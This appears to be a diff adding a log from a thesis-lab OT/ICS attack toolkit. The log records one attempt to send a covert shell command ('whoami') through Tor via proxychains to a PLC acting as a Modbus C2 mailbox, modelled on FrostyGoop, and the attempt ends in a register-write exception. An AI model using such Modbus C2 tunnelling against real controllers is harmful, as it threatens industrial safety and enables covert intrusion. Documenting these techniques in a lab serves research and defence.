@@ -1,0 +1,20 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  C2 Modbus (FrostyGoop) — Comando shell encubierto
+======================================================================
+  Fecha      : 2026-10-13 11:37:19
+  Objetivo   : mailbox=192.168.10.11:502, cmd='whoami'
+  MITRE ICS  : T0869, T0807
+======================================================================
+$ proxychains python3 -m modules._cli.c2_modbus_cli shell --mailbox 192.168.10.11 --mailbox-port 502 --command whoami
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+
+────────────────────────────────────────────────────────────
+[C2] Shell command: whoami
+────────────────────────────────────────────────────────────
+[*] Conectando a PLC-buzón 192.168.10.11:502...
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.11:502  ...  OK
+[!] Error escribiendo registros de comando: ExceptionResponse(dev_id=1, function_code=144, exception_code=11)
+[=] Código de salida: 0
